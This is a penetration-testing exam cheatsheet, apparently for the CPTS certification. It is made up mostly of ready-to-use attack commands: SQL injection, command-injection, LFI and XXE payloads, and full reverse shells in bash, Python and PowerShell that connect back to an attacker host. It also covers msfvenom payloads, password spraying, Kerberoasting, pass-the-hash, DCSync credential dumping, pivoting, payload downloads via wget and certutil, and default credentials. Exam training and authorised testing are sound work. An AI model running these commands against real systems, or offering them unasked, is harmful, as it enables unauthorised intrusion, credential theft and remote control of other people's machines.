# CPTS Exam Day Cheatsheet

Quick reference for the 10-day exam. Print this or keep it open.

---

## Initial Enumeration

```bash
# Full network scan
nmap -sV -sC -oA initial SCOPE/24
nmap -p- --min-rate=1000 -oA full SCOPE/24
sudo nmap -sU --top-ports 50 -oA udp SCOPE/24

# Web enumeration (on every HTTP/HTTPS port)
whatweb http://TARGET
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.html,.bak,.conf -fc 404
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs DEFAULT_SIZE
curl http://TARGET/robots.txt
curl http://TARGET/.git/HEAD
curl http://TARGET/.env

# Service enumeration
enum4linux -a TARGET                           # SMB
smbclient -L //TARGET -N                       # SMB shares
showmount -e TARGET                            # NFS
snmpwalk -v2c -c public TARGET                 # SNMP
dig axfr domain.com @TARGET                    # DNS zone transfer
```

## Web Attacks Quick Reference

```bash
# SQLi
' OR 1=1-- -                                   # Auth bypass
' UNION SELECT 1,2,3-- -                       # UNION (adjust column count)
sqlmap -u "http://TARGET/page?id=1" --batch    # Automated
sqlmap -r request.txt --batch --dbs             # From Burp saved request

# Command Injection
;id                                             # Semicolon
|id                                             # Pipe
$(id)                                           # Command substitution
`id`                                            # Backticks

# LFI
../../../../etc/passwd
php://filter/convert.base64-encode/resource=config.php
# Log poisoning: inject PHP in User-Agent → include access.log

# File Upload
shell.php → shell.phtml → shell.php5 → shell.php.jpg

# IDOR
Change id=YOUR_ID to id=OTHER_ID in URL, POST body, cookies

# XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Verb Tampering
curl -X PUT / -X PATCH / -X DELETE / -X HEAD -v TARGET/restricted_page
```

## Shells

```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)};$c.Close()"

# Stabilize Linux shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# MSFVenom payloads
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f exe -o shell.exe
msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALI LPORT=4444 -f war -o shell.war
```

## Password Attacks

```bash
# Hydra
hydra -l user -P rockyou.txt ssh://TARGET -t 4 -f
hydra -l user -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -f

# CrackMapExec (spray across network)
crackmapexec smb RANGE -u user -p 'Password1!' --continue-on-success
crackmapexec winrm RANGE -u user -p 'Password1!'

# Hashcat
hashcat -m 0 hash.txt rockyou.txt                    # MD5
hashcat -m 1000 hash.txt rockyou.txt                  # NTLM
hashcat -m 1800 hash.txt rockyou.txt                  # sha512crypt
hashcat -m 13100 hash.txt rockyou.txt                 # Kerberoast TGS
hashcat -m 18200 hash.txt rockyou.txt                 # AS-REP

# John
john --wordlist=rockyou.txt hash.txt
ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt
```

## Active Directory

```bash
# Enumerate
crackmapexec smb DC -u user -p pass --users
crackmapexec smb DC -u user -p pass --shares
bloodhound-python -u user -p pass -d domain -ns DC -c all

# AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC -format hashcat

# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request

# Pass the Hash
impacket-psexec domain/admin@TARGET -hashes LM:NTLM
evil-winrm -i TARGET -u admin -H NTLM_HASH

# DCSync
impacket-secretsdump domain/admin:pass@DC
impacket-secretsdump domain/admin@DC -hashes LM:NTLM
```

## Pivoting

```bash
# SSH SOCKS proxy
ssh -D 9050 -fN user@PIVOT
# Configure: /etc/proxychains4.conf → socks5 127.0.0.1 9050
proxychains nmap -sT -Pn INTERNAL_TARGET

# SSH local port forward
ssh -L LOCAL_PORT:INTERNAL_TARGET:REMOTE_PORT user@PIVOT

# Metasploit autoroute
run autoroute -s INTERNAL_SUBNET/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

## Linux Privesc

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab && ls /etc/cron.d/
getcap -r / 2>/dev/null
ls -la /etc/passwd
find / -writable -type f 2>/dev/null | grep -v proc
# Run LinPEAS
```

## Windows Privesc

```cmd
whoami /priv
:: SeImpersonatePrivilege → PrintSpoofer/GodPotato
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """"
reg query HKLM\...\Winlogon | findstr Default
cmdkey /list
:: PowerShell history
type %APPDATA%\...\PSReadLine\ConsoleHost_history.txt
:: Run WinPEAS
```

## File Transfer

```bash
# Kali → Linux: python3 -m http.server 80 → wget http://KALI/file
# Kali → Windows: impacket-smbserver share . -smb2support → copy \\KALI\share\file
# Kali → Windows: python3 -m http.server 80 → certutil -urlcache -f http://KALI/file file
```

## Application Default Credentials

```
WordPress:    admin:admin           Tomcat:     tomcat:s3cret
Jenkins:      admin:admin           GitLab:     root:5iveL!fe
Splunk:       admin:changeme        PRTG:       prtgadmin:prtgadmin
Nagios:       nagiosadmin:nagiosadmin  Grafana:  admin:admin
Zabbix:       Admin:zabbix          phpMyAdmin: root:(blank)
```
